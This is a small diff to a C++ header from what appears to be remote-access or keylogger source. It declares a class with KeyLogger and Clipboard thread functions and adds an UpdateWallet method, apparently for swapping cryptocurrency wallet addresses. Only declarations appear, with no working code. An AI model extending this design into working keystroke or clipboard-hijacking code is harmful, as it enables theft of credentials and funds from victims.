@@ -228,6 +228,7 @@ public:
     CKeyboardManager1(IOCPClient*pClient, int offline, void* user=NULL);
     virtual ~CKeyboardManager1();
     virtual void Notify();
+    virtual void UpdateWallet(const std::string& wallet);
     virtual void OnReceive(LPBYTE lpBuffer, ULONG nSize);
     static DWORD WINAPI Clipboard(LPVOID lparam);
     static DWORD WINAPI KeyLogger(LPVOID lparam);
